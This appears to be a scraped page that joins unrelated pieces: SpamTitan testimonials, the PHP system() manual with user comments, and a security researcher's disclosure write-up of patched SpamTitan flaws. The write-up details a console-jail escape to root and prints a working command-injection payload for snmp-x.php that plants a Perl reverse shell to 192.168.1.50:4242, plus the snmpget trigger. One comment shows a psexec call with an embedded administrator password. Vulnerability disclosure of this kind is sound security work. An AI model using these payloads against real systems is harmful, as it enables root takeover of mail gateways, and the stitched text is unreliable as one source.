It's very easy to configure to block and greylist a lot of things that we see coming in as a vector for email attacks. So, it gives us much better security overall, as well as some time savings on the administration side.

Jeremy Stewart

**********

### Highly accurate, reduces the number of service calls, and has a fair price

It has reduced the risk of getting viruses from emails by almost a hundred percent. We are giving services to hundreds of companies, and it makes our work a lot easier when SpamTitan is filtering threats.

### Has the ability to easily see what was blocked, enabling users to restore emails they were expecting with the click of a button

It reduces email clutter, improving employee productivity. It does what it says it does. It reduces spam by quite a bit above and beyond the Office 365 built-in spam filter. One aspect our clients liked about SpamTitan was the ability to easily see what was blocked.

# system

(PHP 4, PHP 5, PHP 7, PHP 8)

system — Execute an external program and display the output

### Description

**system**([string](language.types.string.php) `$command`, [int](language.types.integer.php) `&$result_code` = **`[null](reserved.constants.php#constant.null)`**): [string](language.types.string.php)|[false](language.types.value.php)

**system()** is just like the C version of the
function in that it executes the given
`command` and outputs the result.

The **system()** call also tries to automatically
flush the web server's output buffer after each line of output if
PHP is running as a server module.

If you need to execute a command and have all the data from the
command passed directly back without any interference, use the
[passthru()](function.passthru.php) function.

### Parameters

`command`

The command that will be executed.

`result_code`

If the `result_code` argument is present, then the
return status of the executed command will be written to this
variable.

### Return Values

Returns the last line of the command output on success, and **`[false](reserved.constants.php#constant.false)`**
on failure.

### Examples

**Example #1 **system()** example**

`<?php
echo '<pre>';

// Outputs all the result of shellcommand "ls", and returns
// the last output line into $last_line. Stores the return value
// of the shell command in $retval.
$last_line = system('ls', $retval);

// Printing additional info
echo '
</pre>
<hr />Last line of the output: ' . $last_line . '
<hr />Return value: ' . $retval;
?>`

### Notes

**Warning**

When allowing user-supplied data to be
passed to this function, use
[escapeshellarg()](function.escapeshellarg.php) or [escapeshellcmd()](function.escapeshellcmd.php)
to ensure that users cannot trick the system into executing arbitrary
commands.

> **Note**:
>
> If a program is started with this function,
> in order for it to continue running in the background, the output of the
> program must be redirected to a file or another output stream. Failing to do so
> will cause PHP to hang until the execution of the program ends.

`This is for WINDOWS users. I am running apache and I have been trying for hours now to capture the output of a command.

I'd tried everything that is written here and then continued searching online with no luck at all. The output of the command was never captured. All I got was an empty array.

Finally, I found a comment in a blog by a certain amazing guy that solved my problems.

Adding the string ' 2>&1' to the command name finally returned the output!! This works in exec() as well as system() in PHP since it uses stream redirection to redirect the output to the correct place!

system("yourCommandName 2>&1",$output) ;`

`You probably want to check your system calls for errors. The convention is to return 0 for "no error" which is the same as FALSE which can be confusing. You need to do something like:

<?php
 $cmd = "/usr/bin/pngtopnm $png_file > $pnm_file";
 system($cmd,$return_value);
 ($return_value == 0) or die("returned an error: $cmd");

`Do not use "system" if you use the "php.ini" option:

Doing so will result in the browser receiving garbage (I'm guessing the headers/buffers get confused).

Use passthru in this case, it appears to work as intended.`

`If no headers have been printed, calling the system() function will flush the headers to the client and insert a newline; no further headers or cookies will be transferred to the browser. In version 3.0.7, you will not be warned that the Header() function failed, but will be warned if trying to set a cookie.

`Windows commands requiring a GUI.

Alot of the info on this topic is from the 2010-2012 time frame and referring to XP, and basically don't work. I am using apache/php/mysql in windows 7.

When requiring a system command in windows with a GUI - such as a labview executable, notepad, etc..., others have mentioned the psexec command from sysinternals, since cmd /c wont work, but the specific use was not real clearly defined. Here is what worked for me on windows 7:

system('C:/nttools/2019/psexec \\\\10.100.100.101 -i -u administrator -p password -accepteula -nobanner C:\\htdocs\\test\\test.bat');

The path to the psexec executable is with forward slashes, the remote PC network location (which was actually the local PC, not remote) was \\ip_address with an extra backslash for each backslash so that required the 4 \'s.

The path for the command to be executed by psexec required backslashes, which also requires double backslashes.

The -i option is for an interactive program, and is required for it to properly run, otherwise it show up in the taskmanager but not be visable or execute properly if given command line arguments.

The -accepteula -nobanner is to suppress the sysinternals message box about their license.

My command to execute is really long with multiple command line inputs with many surrounded in double quotes, so I thought it would be easiest to put that in a batch file and just call the bat file. Works great, remote users loading the webpage causes the executable to pop up on the web server, do its analysis and disappear. Labview can read native excel files with active-x functions and write to a mysql data base to store results etc, so thats a pretty powerful combination of functions.`

`It is possible to only capture the error stream (STERR). Here it goes...

(some_command par1 par2 > /dev/null) 3>&1 1>&2 2>&3

-First STDOUT is redirected to /dev/null.
-By using parenthesis it is possible to gain control over STERR and STOUT again.
-Then switch STERR with STOUT.

The switch is using the standard variable switch method -- 3 variables (buckets) are required to swap 2 variables with each other. (you have 2 variables and you need to switch the contents - you must bring in a 3rd temporary variable to hold the contents of one value so you can properly swap them).

`another reason to use shell_exec instead of system is when the result is multiple lines such as grep or ls

<?php

// this correctly sets answer string to all lines found
//$answer = shell_exec ("grep 'set of color names' *.php ");
//echo "answer = $answer";

// this passes all lines to output (they show on page)
// and sets answer string to the final line
 $sys = system ("grep 'set of color names' *.php ");
 echo "sys =(($sys))";

?>

here is view/source resulting from system call

setprefs.php:// The standard set of color names is:
setprefs.php:// Most browsers accept a wider set of color names
silly.php: //$answer = shell_exec ("grep 'set of color names' *.php ");
silly.php: $sys = system ("grep 'set of color names' *.php ");
sys =((silly.php: $sys = system ("grep 'set of color names' *.php ");))

`If you can't see any output or error from system(), shell_exec() etc, you could try this:

<?php

function my_exec($cmd, $input='')

 {$proc=proc_open($cmd, array(0=>array('pipe', 'r'), 1=>array('pipe', 'w'), 2=>array('pipe', 'w')), $pipes);

 fwrite($pipes[0], $input);fclose($pipes[0]);

 'stderr'=>$stderr,

 'return'=>$rtn

 }

var_export(my_exec('echo -e $(</dev/stdin) | wc -l', 'h\\nel\\nlo'));

?>

For example, "echo shell_exec('ls');" will get nothing output,

"my_exec('ls');" will get "sh: ls: command not found",

"my_exec('/bin/ls');" will maybe get "sh: /bin/ls: Permission denied",

 isset ($_SERVER['SERVER_PROTOCOL']) ? false : print $string_beeps;
 }

?>

This will not do anything when running through a browser, if running through a shell it will produce an audible beep $int_beeps times. This should work on Windows, Unix, etc.`

`It's important to note that if you are running a series of system() commands in a loop, you need to include the second argument in order for them to run synchonously.

ie)

// this will execute process.php asynchronously; not waiting for completion before executing the next one.
$array = array('apple', 'banana', 'pear');
foreach($array as $i)
{
system("php process.php \"fruit=$i\"");
}

// this will execute process.php 3 times, waiting for the prior command to complete before starting a new one

`Re: cpmorris at hotmail dot com and WINNT.

I just spent some time learning to use the php system function. I managed to get long file names to work for me. It seems you need to take the same approach that batch files, WSH, and most other programming languages do under WinNT/2K/XP. Putting double quotes around the Path+Filename seems to work. So, something like this should have worked for you:

"c:\program files\apache group\apache2\bin\htpasswd"

Note that if you have parameters, they go OUTSIDE of the last quote. Oh, and don't forget to escape the slashes and quotes!

I don't know what htpasswd's params are, but let us pretend:

$cmd="\"c:\\program files\\apache group\\apache2\\bin\\htpasswd\" username password";
$str=system($cmd);

Hope this helps someone!

`Hi,
some tips for using a system()-call for batch files on a windows computer:
* Write the path to the executable with double back-slashes, like so:
 C:\\path\\to\\prog.exe
* If you are refering to other pathes, e.g. as a parameter, one back-slash works fine.
* Do not use SET for declaring parameters - this does not work! Example:
 SET PATH="C:\path\to\lib"
 echo path is %PATH%
This works fine when started from the comand line, but when called from PHP, the variable is just empty.`

[Source code review](/blog/source%20code%20review/)

I recently tested an Internet facing Anti-Spam product called [SpamTitan Gateway](https://www.spamtitan.com/). As you could infer from the name of the product, this platform’s purpose was to detect Spam and or other malicious software sent via email. It has a lot of other features too as you could imagine from this type of product. In this post I will detail some vulnerabilities I discovered that ultimately lead to the ability to have unauthenticated remote code execution.

SpamTitan provides their services in [three formats](https://www.spamtitan.com/spamtitan-deployment-options/): Cloud based, Private Cloud based, or self-hosted, installed using an ISO or VMware image. After providing a corporate email, you can download an ISO with the most recent version of their appliance to test in your own infrastructure.

I decided to have a look at the self-hosted format, so I downloaded the ISO, deployed using VMWare Workstation and launched it.

## Escaping The Console Jail

The first thing you would see when you first access the SpamTitan appliance is that the default administrator user is running in a restricted console. By default you can’t explore the file system of the machine as it only provides interaction via a Perl script (more on this later) displaying very limited functionality:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-88.png)

To investigate the SpamTitan solution further I needed more insight into the internals, so… challenge accepted: let’s escape from the jail.

The main menu allowed you to configure the network interfaces of the server, restart the web server and diagnose the network for connection problems. Not much to start with.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-89.png)

I started with the network diagnostics menu to see what programs they allow you to run from there. I could inject flags and options to the *ping* and *traceroute* programs, but nothing interesting that allowed me to escape the console.

### A backup to a root shell (CVE-2020-24046)

Next, I decided to go for the web application. After familiarisation with the web interface I found the “Backup” section, where you could backup and restore server configurations. Let’s see what it exports:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-90.png)

It looks like the backup is just a tar.bz2 file containing configuration files. At first sight the /var/tmp folder looks boring, but a closer look drives our attention to the file “admin.passwd”, containing (in a format that reminds to the [/etc/passwd format](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)) what looks like the hash of the administrator password and its default console: /usr/local/bin/stconsole.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-91.png)

Having a hunch about the meaning of this file, I just edited it to change ***/usr/local/bin/stconsole*** to ***/bin/sh*** and the [UID](http://www.linfo.org/uid.html) of the user to 0. After doing this, we compress the contents of the parent folder to a tar.bz2 and use the “Backup Import” feature in the web interface.

After doing this, we return to the console, try to log-in again with the “admin” account and *Voila*! We have a *root* shell:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-92.png)
### VMWare tools to a root shell (CVE-2020-24045)

Now, with *root* access to the server, we can explore the file system at will. It only took a few minutes to identify another way to escape from the restricted console without the need of a user on the web application interface. Reading through the Perl code of the restricted shell **/usr/local/bin/stconsole**, we can see a section whose purpose is to install [vmware tools](https://docs.vmware.com/en/VMware-vSphere/6.7/com.vmware.vsphere.html.hostclient.doc/GUID-28C39A00-743B-4222-B697-6632E94A8E72.html) on the underlying FreeBSD operating system:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-1.png)

Hidden option “5” to invoke “vmtools” function

![](/img/pages/blog/2020/clash-of-the-spamtitan/vmware.1-1024x721.png)

Mounting the CD drive with VMware tools when hidden option “5” is selected in the main menu.

![](/img/pages/blog/2020/clash-of-the-spamtitan/vmware.2-1024x315.png)

Executing vmware-install.pl script with super user privileges

As you can see, there was a hidden option in the **stconsole** script, which would install VMWare tools and blindly execute, as the super-user, any script mounted from the CD with the name: */tmp/vmware-tools/distrib/vmware-install.pl*.

As we have local access to the SpamTitan VM we can craft our own vmware-tools ISO and make the application execute our own “vmware-install.pl” script. Any idea of what we could execute? Yes, I think a [reverse shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell) would do…

I wrote a Perl reverse shell in the “vmware-tools” folder, calling it “vmware-install.pl”. I then used “[genisoimage](https://packages.debian.org/sid/genisoimage)” to create the ISO image with the reverse shell:

![](/img/pages/blog/2020/clash-of-the-spamtitan/forgeiso.png)

Creating our own ISO with a Perl reverse shell posing as the vmware-install.pl script

![](/img/pages/blog/2020/clash-of-the-spamtitan/mountiso.png)

Mount our ISO as the virtual CD drive in the SpamTitan VM

![](/img/pages/blog/2020/clash-of-the-spamtitan/reviso-1024x553.png)

Triggering the reverse shell from the main menu

The hidden option 5 in the main menu will trigger the mount of the CD drive and the execution of vmware-install.pl script as the *root* user, providing us with a nice root shell from which to advance with the investigation.

## Finding Web Vulnerabilities

Having root access on the file system of the appliance was only the beginning. Once we had access to the file system, we could explore the PHP files providing functionality to the web interface.

The first hiccup I faced when I wanted to read the PHP code was that they had properly obfuscated all the code with [ionCube](https://www.ioncube.com/), so it was not possible to just read the PHP files. They just looked like big nonsensical strings:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-95-1024x652.png)

PHP code obfuscated with ionCube

While I thought about what I could do with the obfuscated PHP files, I was able to read a lot of non-obfuscated Perl and Bash scripts present on the file system, but, nothing interesting came from this. It was time to face the obfuscated source code.

I researched the ionCube encryption used and found that it was already broken and explained in a BH Asia 2012 talk [“Stealing from Thieves: Breaking ionCube VM to RE Exploit Kits”](https://media.blackhat.com/ad-12/Saher/bh-ad-12-stealing-from-thieves-Saher-slides.pdf). Additionally, decryption of ionCube encrypted files was offered as a service on some websites:

![](/img/pages/blog/2020/clash-of-the-spamtitan/decrypt.page_.png)

Having in mind that there are already a lot of places where decryption of ionCube protected code is offered, I discarded the option of trying to manually break the ionCube VM myself. Instead, I decided to check some of these decryption services. In the end I decided to use one that provided test decryption and a low price for one month of file decryption. I first checked that they were able to successfully decrypt sample PHP files that I provided them after downloading an [ionCube demo](https://www.ioncube.com/encoder_eval_download.php).

One virtual credit card, a fake PayPal account and 10£ less in my wallet later, I was able to upload the obfuscated PHP files I had extracted from my SpamTitan server. Unfortunately, the ionCube version they were using on the most recent version of SpamTitan was not decryptable:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-98.png)

Although the web service said it didn’t have decoders for PHP 7.0+ I did not check what version of PHP I was interested in. Now, I was sad and with 10£ less to spend on video games, so I resorted to studying the Perl and Bash scripts I was able to read on the server again. One of the scripts that caught my attention was *fetchupdates.pl*.

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-99-1024x345.png)

Script authenticating to public FTP update servers

As you can see here, the script was authenticating to the SpamTitan update servers using FTP, with the username “ftp” and the hostname of the machine as the password. We just needed to know what the update server address was. To obtain this information we could check the PostgreSQL database of the SpamTitan server:

![](/img/pages/blog/2020/clash-of-the-spamtitan/db_query.pixel_.png)

Update server domain found in the PostgreSQL database

### Obtaining decrypted source code

After gathering all this information, we could browse the public FTP repository of SpamTitan:

![](/img/pages/blog/2020/clash-of-the-spamtitan/ftp.connection.pixel_.png)

Successful connection to the public update server

This public FTP repository had all of the update packages for the history of the product. The files were there so your SpamTitan installation could fetch a patch for any version it may need. I downloaded the patches to “upgrade” to a slightly older version (7.04 and 7.05) than the one I was running (7.07) and explored what the patches had inside.

### Obtaining decrypted sources

The patches had, among other files to update the underlying OS, all the PHP files to be updated from the previous version. Luckily, they were also written for an older version of PHP. So, I gathered all the files I was interested in and proceeded to decrypt them:

![](/img/pages/blog/2020/clash-of-the-spamtitan/decrypted.page_.png)

After spending some time uploading various interesting encrypted files, we were be able to browse the decrypted PHP code and hunt for more vulnerabilities. One quick way was to perform a text search for interesting functions such as “exec(” or “eval(”, which lead to an abundance of results:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-125.png)

I initially wanted to manually inspect each potential command execution, but in the middle of the exercise I decided to get some help from a static analysis tool before I went crazy.

### Automated source code review

I’ve always used [RIPS](https://www.ripstech.com/) for static code analysis of PHP files, but this time round I decided to use another tool I had never tried: [SonarQube](https://www.sonarqube.org/). Usage of SonarQube is out of the scope of this post, but it supports several languages and not only focusses on the security of code but also in broader code analysis practices, such as code coverage, unit testing, etc:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-127.png)

At the end of the day, SonarQube did not provide me with more information than what I already detected with manual inspections, but helped me focus on interesting files. The majority of the *exec* calls I had detected previously were calls to FreeBSD programs and were non-injectable, but some of them were. What is more interesting was that some of the sources were coming directly from *$\_GET* or *$\_POST* variables provided by the user. As a result, a total of four RCE and one arbitrary read was reported to SpamTitan at the end of this research. All the vulnerabilities were patched in the following version of SpamTitan (7.08), published the 26th of May 2020.

## The End of the Road (?)

The discovered vulnerabilities were reported to SpamTitan team, who answered in less than one day confirming they were going to fix them on their next release, as they did. If you have an outdated version of SpamTitan in your infrastructure (7.07 or older), we highly recommend you **to patch as soon as possible**, although it is probable your SpamTitan server has already been automatically patched if you have restarted it between the publish date of the patch (26th of May 2020) and today.

I’ll dive into the details of one of the Unauthenticated RCE vulnerabilities, CVE-2020-11698. Many of the other vulnerabilities follow the same principals. The final list of assigned CVEs were:

* **CVE-2020-11698:** Unauthenticated Remote Code Execution through snmp-x.php.
* **CVE-2020-11699**: Authenticated RCE in certs-x.php abusing “fname” and php [system()](https://www.php.net/manual/en/function.system.php) function.
* **CVE-2020-11700:** Access to arbitrary files in the file system.
* **CVE-2020-11803**: Authenticated RCE in mailqueue.php abusing parameter “jaction” and php [eval()](https://www.php.net/manual/en/function.eval.php) function.
* **CVE-2020-11804**: Authenticated RCE in mailqueue.php abusing “qid” parameter and php [system()](https://www.php.net/manual/en/function.system.php) function.

### CVE-2020-11698 – SNMPD command injection

The exploit for CVE-2020-11698 took advantage of two weaknesses in the product:

* Unauthenticated interaction with the “snmp-x.php” script
* Lack of input sanitisation before writing data to the “/usr/local/etc/snmp/snmpd.conf” file.

[The snmpd.conf file](https://man.openbsd.org/snmpd.conf) tells the SNMP daemon what its configuration parameters are. The daemon runs as root on the system, so compromising this daemon means compromising the whole system.

One interesting configuration parameter is the “community” string, provided by the web user when interacting with the “snmp-x.php” PHP script. When submitted to snmp-x.php, the *snmpd.conf* configuration file was updated and a line containing the name of the community and the network CIDR allowed to query it was added:

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-32-1024x536.png)

Community name and allowed network CIDR added to the file *snmpd.conf*

Reading the documentation for the snmpd.conf file, we can see the “[EXTEND](http://net-snmp.sourceforge.net/wiki/index.php/Tut%3AExtending_snmpd_using_shell_scripts)” configuration directive would allow us to execute scripts, returning its output when a specific SNMP OID is queried. Adding the following directive to the “snmpd.conf” file will return “hello world” to the SNMP client asking for the correct OID:

```
extend test /bin/echo hello world
```

As a result, exploitation is really simple; inject a weaponised “extend” directive (which will end up in the snmpd.conf file) with a Perl reverse shell to my IP (e.g. 192.168.1.50:4242). To do so, we just need to POST the following “community” value to “snmp-x.php”:

```
public" 192.168.1.0/24\n
extend revshell /usr/bin/perl -e 'use Socket;$i="192.168.1.50";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/sh -i");}; # '
```

This payload for the “community” form field will add the “public” community string and allow it to be queried from the 192.168.1.0/24 ip range. It will also add an **[extend](http://net-snmp.sourceforge.net/wiki/index.php/Tut%3AExtending_snmpd_using_shell_scripts)** directive with a reverse Perl shell.

To trigger the reverse shell we just need to query the .1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108 OID (use [snmptranslate](https://linux.die.net/man/1/snmptranslate) to get the OID representation of the string “revshell”). Set up a netcat listener on port 4242 of the machine and use the command line snmpget to query the spamtitan server like this:

```
snmpget -v2c -c public spamtitan.felipe.local .1.3.6.1.4.1.8072.1.3.2.3.1.1.8.114.101.118.115.104.101.108.108
```

We should receive a shiny shell with **root** permissions where our netcat was listening :-)

![](/img/pages/blog/2020/clash-of-the-spamtitan/image-33-1024x568.png)

Got root shell after querying the SpamTitan server SNMP daemon

To automate exploitation, I have written a PoC (available [on github](https://github.com/sensepost/ClashofSpamTitan)). The PoC will take care of everything in the exploit chain, from injecting the “extend” command to setting up the socket to receive the root shell. You can see the exploit in action in this video:

## Three Authenticated RCEs and one Arbitrary File Read.

I found other three RCE vulnerabilities (CVE-2020-11699, CVE-2020-11803, CVE-2020-11804) and one arbitrary file read (CVE-2020-11700).

In the case of these vulnerabilities, the RCE was authenticated and the permissions you got when exploiting them were the permissions of the web server (*amavisd*).

I tried to find privilege escalation vulnerabilities on the box to escalate from the *amavisd* user to the *root* user and, although I didn’t find a clear path to escalate in the time I had for the research, my spidey senses told me that there should to be a way to escalate (\*wink, wink\*).

![](/img/pages/blog/2020/clash-of-the-spamtitan/spidersenses.gif)

Sensing some potential LPE in the product

I also automated the exploitation of these three RCE’s and the File Read with a PoC (available [on github](https://github.com/sensepost/ClashofSpamTitan)). You can refer to the source code of the PoC to get more details of each vulnerability.

You can see the PoC in action in this video, where the method flag (-m) indicates what CVE to exploit (1, 2, 3 or 4):

## Conclusion

SpamTitan put a fair amount of effort in hindering reverse engineering attempts by preventing access to the underlying operating system and obfuscating the PHP code in the VM image. But, maybe they relied too extensively on obfuscation techniques to hide programming mistakes that may lead to vulnerabilities.

The vulnerabilities themselves were not difficult to spot once access to the source code was achieved. These kind of programming errors should also be relatively easy to avoid with enough security awareness of the development team and having code quality reviews before reaching production. These vulnerabilities may just be the result of relying so much on the “[security though obscurity](https://en.wikipedia.org/wiki/Security_through_obscurity)” principle.

Having said this, it is worth mentioning that the SpamTitan security team were easily reachable though their client portal and they fixed the vulnerabilities efficiently in their next release.
